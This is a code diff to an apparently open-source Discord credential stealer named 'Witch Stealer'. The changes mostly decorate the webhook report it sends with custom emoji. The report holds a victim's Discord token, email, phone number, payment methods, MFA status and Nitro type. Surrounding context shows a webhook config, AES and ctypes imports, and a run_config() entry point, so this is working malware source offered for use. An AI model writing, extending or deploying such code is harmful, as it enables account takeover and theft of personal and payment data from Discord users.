@@ -23,7 +23,6 @@ import ctypes
 from ctypes import wintypes, byref, c_bool
 from Crypto.Cipher import AES
 
-
 __CONFIG__ = {
     "avatar_link": "https://cdn.pfps.gg/pfps/56483-dark-girl.jpeg",
     "webhook": "",
@@ -169,12 +168,12 @@ def tokens(token: str):
         premium_type = user.get("premium_type", 0)
         nitro_type = {
             0: "None",
-            1: "Nitro Classic",
-            2: "Nitro Boost",
-            3: "Basic Nitro"
-        }.get(premium_type, "Unknown")
+            1: "<:nitro_classic:1363064691282149418> Nitro Classic",
+            2: "<:nitro_booster:1363009541515513986> Nitro Boost",
+            3: "<:nitro_booster:1363009541515513986> <:nitro_classic:1363064691282149418> Basic Nitro"
+        }.get(premium_type, "❓️")
 
-        mfa = ":white_check_mark:" if user.get("mfa_enabled", False) else ":x:"
+        mfa = "Enabled" if user.get("mfa_enabled", "❓️") else "Disabled"
 
         methods = "❌"
         try:
@@ -243,23 +242,24 @@ def tokens(token: str):
             hq_guilds = '\n'.join(hq_guilds)
         else:
             hq_guilds = None
-
+            #:TOKENPARADISE: 
+            #<a:hq:1373228906743599155>
         fields = [
-            {"name": "TOKEN", "value": f"```{token}```", "inline": False},
-            {"name": "Badge", "value": f"-# {', '.join(user_badges) if user_badges else 'None'}", "inline": True},
-            {"name": "MFA", "value": mfa, "inline": True},
-            {"name": "Nitro", "value": nitro_type, "inline": True},
-            {"name": "Payment", "value": methods, "inline": True},
-            {"name": "TAG", "value": f"```{guild_tag}```", "inline": True},
-            {"name": "Language", "value": lang, "inline": True},
-            {"name": "Friends Invite", "value": f"https://discord.gg/{friendinvite_code}", "inline": True},
-            {"name": "Email", "value": f"```{email}```", "inline": False},
-            {"name": "Phone", "value": f"```{phone}```", "inline": False},
+            {"name": "<a:TOKENPARADISE:1363009172290928690> TOKEN", "value": f"```{token}```", "inline": False},
+            {"name": "<:9171hypesquadevents:1163172248140660839> Badge", "value": f"-# {', '.join(user_badges) if user_badges else 'None'}", "inline": True},
+            {"name": ":white_check_mark: MFA", "value": mfa, "inline": True},
+            {"name": "<a:n1:1380695050484453408> Nitro", "value": nitro_type, "inline": True},
+            {"name": ":credit_card: Payment", "value": methods, "inline": True},
+            {"name": "<:tag:1380757481390604429> TAG", "value": f"```{guild_tag}```", "inline": True},
+            {"name": "<:lang:1380757912200282152> Language", "value": lang, "inline": True},
+            {"name": "<a:hq:1373228906743599155> Friends Invite", "value": f"https://discord.gg/{friendinvite_code}", "inline": True},
+            {"name": "<a:rainbow_heart:1380758186344317091> Email", "value": f"```{email}```", "inline": False},
+            {"name": "<:Telephone:1380759026069016627> Phone", "value": f"```{phone}```", "inline": False},
         ]
 
         if found_guilds:
             fields.append({
-                "name": "HQ Guilds",
+                "name": "<a:hq:1373228906743599155> HQ Guilds",
                 "value": hq_guilds,
                 "inline": False
             })
@@ -270,7 +270,7 @@ def tokens(token: str):
             "username": "Witch Stealer",
             "avatar_url": __CONFIG__["avatar_link"],
             "embeds": [{
-                "title": f"{user_name} ({user_id})",
+                "title": f"<:user:1380756103045976216> {user_name} ({user_id})",
                 "color": 0x000000,
                 "fields": fields,
                 "thumbnail": {"url": avatar}
@@ -671,5 +671,3 @@ def run_config():
     # =========================== #
 
 run_config()
-                                                                                                                                                                                                                     
-# https://github.com/addadi000/Witch-stealer/
